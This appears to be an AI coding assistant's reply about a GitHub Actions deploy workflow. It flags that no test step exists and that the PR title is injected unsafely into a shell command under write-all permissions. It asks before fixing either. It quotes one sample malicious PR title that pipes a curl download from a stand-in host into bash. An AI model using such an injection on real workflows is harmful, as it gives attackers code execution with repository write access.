I looked at `.github/workflows/deploy.yml`, and two things stand out before I can do this correctly:

1. **No test or build step exists yet.** The workflow only checks out the repo and echoes the PR title — there's nothing that runs tests or produces a build artifact, so "after tests pass" has nothing to attach to yet.
2. **Existing injection vulnerability**: `run: echo "Title is ${{ github.event.pull_request.title }}"` interpolates an untrusted, attacker-controlled value (the PR title) directly into the shell command via `${{ }}` expression substitution, before the shell ever sees it. A PR title like `x"; curl evil.sh | bash #` would execute arbitrary code — and this job has `permissions: write-all`, so that's a serious blast radius. The fix is to pass it through `env:` and reference it as `"$PR_TITLE"` instead.

How would you like to proceed?
- Should I add placeholder `build`/`test` steps (e.g. `npm ci`, `npm run build`, `npm test`) so there's something for the upload step to depend on, or do you already have those steps elsewhere and just want the `upload-artifact` step added assuming they'll exist?
- Do you want me to also fix the PR-title injection while I'm in this file, or leave that out of scope for now?
